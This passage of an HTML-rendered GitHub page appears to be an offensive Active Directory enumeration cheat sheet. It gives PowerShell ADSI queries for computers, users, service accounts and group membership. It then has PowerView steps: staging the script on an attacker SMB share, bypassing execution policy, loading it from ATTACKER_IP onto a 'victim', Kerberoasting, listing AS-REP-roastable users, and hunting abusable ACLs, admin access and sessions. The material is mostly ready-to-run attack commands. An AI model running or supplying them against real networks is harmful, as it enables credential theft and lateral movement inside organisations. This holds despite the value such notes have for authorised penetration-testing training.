class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    PRIMARY DC    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$pdc\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003eselect Name\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eIPAddress\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eOSVersion\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eSiteName\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eDomain\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eForest\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eformat-list\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    COMPUTERS    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(objectCategory=computer)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Path\u003c/span\u003e\u003c/span\u003e};\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    USERS    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(objectCategory=person)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Path\u003c/span\u003e\u003c/span\u003e};\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    SERVICES    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(serviceprincipalname=*)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Path\u003c/span\u003e\u003c/span\u003e};\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    GROUPS    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(objectCategory=group)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.Path\u003c/span\u003e\u003c/span\u003e};\n\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e==========    MEMBERSHIP    ==========\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e_r\u003c/span\u003e {\n  \u003cspan class=\"pl-k\"\u003eparam\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$o\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$m\u003c/span\u003e);\n  \u003cspan class=\"pl-k\"\u003eif\u003c/span\u003e (\u003cspan class=\"pl-smi\"\u003e$o\u003cspan class=\"pl-smi\"\u003e.Properties.member\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$null\u003c/span\u003e) {\n    \u003cspan class=\"pl-smi\"\u003e$lm\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eSystem.Collections.ArrayList\u003c/span\u003e]\u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e();\n    \u003cspan class=\"pl-smi\"\u003e$o\u003cspan class=\"pl-smi\"\u003e.Properties.member\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-smi\"\u003e$lm\u003cspan class=\"pl-smi\"\u003e.add\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.split\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e,\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e].replace(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCN=\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e))};\n    \u003cspan class=\"pl-smi\"\u003e$lm\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$lm\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003eselect \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eunique;\n    \u003cspan class=\"pl-smi\"\u003e$m\u003cspan class=\"pl-smi\"\u003e.add\u003c/span\u003e\u003c/span\u003e((\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e psobject \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eProperty \u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e{\n      \u003cspan class=\"pl-smi\"\u003eOU\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$o\u003cspan class=\"pl-smi\"\u003e.Properties.name\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e]\n      \u003cspan class=\"pl-smi\"\u003eM\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e [\u003cspan class=\"pl-k\"\u003estring\u003c/span\u003e]::Join(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e, \u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$lm\u003c/span\u003e)\n    }));\n    \u003cspan class=\"pl-smi\"\u003e$lm\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\n      \u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.filter\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003estring\u003c/span\u003e]::Format(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e(name={0})\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e);\n      \u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{_r \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$m\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eout-null\u003c/span\u003e};\n    }\n  }\n}\n\u003cspan class=\"pl-smi\"\u003e$m\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eSystem.Collections.ArrayList\u003c/span\u003e]\u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e();\n\u003cspan class=\"pl-smi\"\u003e$s\u003cspan class=\"pl-smi\"\u003e.FindAll\u003c/span\u003e\u003c/span\u003e()\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{_r \u003cspan class=\"pl-c1\"\u003e$_\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$m\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eout-null\u003c/span\u003e};\n\u003cspan class=\"pl-smi\"\u003e$m\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003esort-object\u003c/span\u003e OU \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eunique\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003ewrite-host\u003c/span\u003e ([\u003cspan class=\"pl-k\"\u003estring\u003c/span\u003e]::Format(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e[OU] {0}: {1}\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.OU\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.M\u003c/span\u003e\u003c/span\u003e))};\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e5.1.2 Domain Enumeration with PowerView\u003c/h3\u003e\u003ca id=\"user-content-512-domain-enumeration-with-powerview\" class=\"anchor\" aria-label=\"Permalink: 5.1.2 Domain Enumeration with PowerView\" href=\"#512-domain-enumeration-with-powerview\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePowerView is a PowerShell script that makes enumerating Active Directory much easier. To see a list of all available functions, see the \u003ca href=\"https://powersploit.readthedocs.io/en/latest/Recon/\" rel=\"nofollow\"\u003edocumentation\u003c/a\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo get a copy on Kali for transfer to your victim:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .\n\n# also grab sysinternals suite in case you need it\nwget https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals SysinternalsSuite.zip\n\nimpacket-smbserver -smb2support -user derp -password herpderp share .\"\u003e\u003cpre\u003ecp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e also grab sysinternals suite in case you need it\u003c/span\u003e\nwget https://download.sysinternals.com/files/SysinternalsSuite.zip\nunzip -d sysinternals SysinternalsSuite.zip\n\nimpacket-smbserver -smb2support -user derp -password herpderp share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsage (some commands may take a minute or two to complete):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# stop complaints about running downloaded scripts\npowershell -ep bypass\n\n# connect to attacker SMB share\nnet use \\\\ATTACKER_IP herpderp /user:derp\n\n# load all the functions from PowerView into your session\nImport-Module \\\\ATTACKER_IP\\share\\PowerView.ps1\n\n# basic info about the current domain\nGet-Domain\n\n# list all domain controllers\nGet-DomainController\n\n\n# List AS-REP Roastable users\nGet-DomainUser -PreauthNotRequired | select samaccountname\n# Kerberoast all kerberoastable users\nInvoke-Kerberoast | fl\n# Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts. (takes time)\nInvoke-UserHunter -CheckAccess\n# complete information about a single user to view available fields\nGet-NetUser | Select -First 1\n# complete information about specific user\nGet-NetUser USERNAME\n# list of all usernames with last logon and password set times\nGet-NetUser | select samaccountname,pwdlastset,lastlogon\n\n# list of all service accounts, or Service Principal Names (SPNs)\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n\n# Find interesting ACLs (takes time)\nInvoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights | fl\n# list of all ACEs (permissions) for specific user\nGet-ObjectAcl -Identity USER_OR_GROUP_NAME\n# filter list for \u0026quot;interesting\u0026quot; permissions\nGet-ObjectAcl -Identity \u0026quot;Management Department\u0026quot; | ? {\u0026quot;GenericAll\u0026quot;,\u0026quot;GenericWrite\u0026quot;,\u0026quot;WriteOwner\u0026quot;,\u0026quot;WriteDACL\u0026quot;,\u0026quot;AllExtendedRights\u0026quot;,\u0026quot;ForceChangePassword\u0026quot;,\u0026quot;Self\u0026quot; -eq $_.ActiveDirectoryRights} | % {[pscustomobject]@{Name=$_.SecurityIdentifier|Convert-SidToName;Permissions=$_.ActiveDirectoryRights}}\n\n# convert SID to name (useful for translating Get-ObjectAcl output)\nConvert-SidToName SID\n\n# list of all group names\nGet-NetGroup | select samaccountname,description\n# all members of specific group\nGet-DomainGroupMember \u0026quot;Domain Admins\u0026quot; | select membername\n\n# enumerates the local groups on the local (or remote) machine\n# same as 'net localgroup' command, but for remote computers\nGet-NetLocalGroup -ComputerName NAME\n\n# list all computers\nGet-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion\n# get all IP addresses and hostnames\nresolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})\n# get IP of specific computer\nResolve-IPAddress -ComputerName NAME\n\n# finds machines on the local domain where the current user has local administrator access\nFind-LocalAdminAccess\n# finds reachable shares on domain machines\nFind-DomainShare\nFind-DomainShare -CheckShareAccess|fl # only list those we can access\n# finds domain machines where specific users are logged into\nFind-DomainUserLocation\n# enumerates the members of specified local group on machines in the domain\nFind-DomainLocalGroupMember\n# finds domain machines where specific processes are currently running\nFind-DomainProcess\n\n# returns users logged on the local (or a remote) machine\nGet-NetLoggedon\n# enumerates members of a specific local group on the local (or remote) machine\nGet-NetLocalGroupMember\n# returns open shares on the local (or a remote) machine\nGet-NetShare\n# returns session information for the local (or a remote) machine\n# queries registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity\\SrvsvcSessionInfo\n# which is locked down to Admins starting with Win10-1709 and Server2019-1809, so won't work\nGet-NetSession -ComputerName NAME -Verbose\n# if Get-NetSession doesn't work, try PsLoggedon.exe from Sysinternals\n# (requires Remote Registry service to be enabled):\n.\\PsLoggedon.exe \\\\HOSTNAME\n\n# list all sites in domain\nGet-DomainSite | select cn\n# list all subnets\nGet-DomainSubnet\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e stop complaints about running downloaded scripts\u003c/span\u003e\npowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect to attacker SMB share\u003c/span\u003e\nnet use \\\\ATTACKER_IP herpderp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003euser:derp\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e load all the functions from PowerView into your session\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eImport-Module\u003c/span\u003e \\\\ATTACKER_IP\\share\\PowerView.ps1\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic info about the current domain\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-Domain\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list all domain controllers\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainController\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e List AS-REP Roastable users\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ePreauthNotRequired \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select samaccountname\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kerberoast all kerberoastable users\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-Kerberoast\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts. (takes time)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-UserHunter\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eCheckAccess\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e complete information about a single user to view available fields\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e Select \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eFirst \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e complete information about specific user\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetUser\u003c/span\u003e USERNAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list of all usernames with last logon and password set times\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select samaccountname\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003epwdlastset\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003elastlogon\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list of all service accounts, or Service Principal Names (SPNs)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetUser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eSPN \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select samaccountname\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eserviceprincipalname\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Find interesting ACLs (takes time)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eInvoke-ACLScanner\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eResolveGUIDs \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select IdentityReferenceName\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eObjectDN\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003eActiveDirectoryRights \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fl\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list of all ACEs (permissions) for specific user\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ObjectAcl\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eIdentity USER_OR_GROUP_NAME\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e filter list for \"interesting\" permissions\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-ObjectAcl\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eIdentity \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eManagement Department\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e {\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGenericAll\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eGenericWrite\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eWriteOwner\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eWriteDACL\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eAllExtendedRights\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eForceChangePassword\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSelf\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-eq\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.ActiveDirectoryRights\u003c/span\u003e\u003c/span\u003e} \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e {[\u003cspan class=\"pl-k\"\u003epscustomobject\u003c/span\u003e]\u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e{\u003cspan class=\"pl-smi\"\u003eName\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.SecurityIdentifier\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eConvert-SidToName\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003ePermissions\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e$_\u003cspan class=\"pl-smi\"\u003e.ActiveDirectoryRights\u003c/span\u003e\u003c/span\u003e}}\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert SID to name (useful for translating Get-ObjectAcl output)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eConvert-SidToName\u003c/span\u003e SID\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list of all group names\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetGroup\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select samaccountname\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003edescription\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e all members of specific group\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-DomainGroupMember\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eDomain Admins\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e select membername\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enumerates the local groups on the local (or remote) machine\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e same as 'net localgroup' command, but for remote computers\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eGet-NetLocalGroup\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComputerName NAME\n\n\u003cspan 